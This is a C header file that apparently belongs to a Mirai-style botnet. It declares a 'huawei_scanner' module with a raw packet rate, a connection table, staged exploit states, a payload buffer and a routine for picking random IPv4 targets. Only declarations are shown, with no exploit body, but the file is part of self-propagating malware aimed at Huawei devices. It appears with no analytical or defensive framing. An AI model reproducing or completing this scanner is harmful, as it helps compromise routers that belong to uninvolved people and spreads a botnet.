#ifdef huawei

#pragma once

#include <stdint.h>

#include "../../h/i.h"

#define huawei_scanner_MAX_CONNS 256
#define huawei_scanner_RAW_PPS 320

#define huawei_scanner_RDBUF_SIZE 1024
#define huawei_scanner_HACK_DRAIN 64

struct huawei_scanner_connection
{
    int fd, last_recv;
    enum
    {
        huawei_scanner_SC_CLOSED,
        huawei_scanner_SC_CONNECTING,
        huawei_scanner_SC_EXPLOIT_STAGE2,
        huawei_scanner_SC_EXPLOIT_STAGE3,
    } state;
    ipv4_t dst_addr;
    uint16_t dst_port;
    int rdbuf_pos;
    char rdbuf[huawei_scanner_RDBUF_SIZE];
    char payload_buf[2024];
};

void huawei_scanner();
void huawei_scanner_kill(void);

static void huawei_scanner_setup_connection(struct huawei_scanner_connection *);
static ipv4_t huawei_scanner_get_random_ip(void);

#endif
